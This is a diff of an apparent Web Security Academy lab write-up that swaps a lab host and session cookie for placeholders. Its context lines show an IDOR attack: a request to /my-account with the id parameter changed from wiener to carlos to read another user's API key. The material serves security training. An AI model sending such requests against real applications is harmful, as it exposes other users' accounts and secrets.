@@ -7,8 +7,8 @@ You can log in to your own account using the following credentials: wiener:peter
 With burp up and running, i access the account page using the credentials provided, as follows:
 
 GET /my-account?id=wiener HTTP/2
-Host: 0a10000604e8f82d805ac1f40063009c.web-security-academy.net
-Cookie: session=uqYJ21xfSqKT3PFD5c9Z2K1gbVD0nHH4
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSION_ID
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
@@ -20,7 +20,7 @@ Sec-Fetch-Dest: document
 Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Windows"
-Referer: https://0a10000604e8f82d805ac1f40063009c.web-security-academy.net/login
+Referer: https://LAB_ID.web-security-academy.net/login
 Accept-Encoding: gzip, deflate, br
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Priority: u=0, i
@@ -108,8 +108,8 @@ Its possible to see that the API key is disclosed on the account page of each in
 Repeater and change the id value from wiener to carlos:
 
 GET /my-account?id=carlos HTTP/2
-Host: 0a10000604e8f82d805ac1f40063009c.web-security-academy.net
-Cookie: session=uqYJ21xfSqKT3PFD5c9Z2K1gbVD0nHH4
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSION_ID
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
@@ -121,7 +121,7 @@ Sec-Fetch-Dest: document
 Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Windows"
-Referer: https://0a10000604e8f82d805ac1f40063009c.web-security-academy.net/login
+Referer: https://LAB_ID.web-security-academy.net/login
 Accept-Encoding: gzip, deflate, br
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Priority: u=0, i
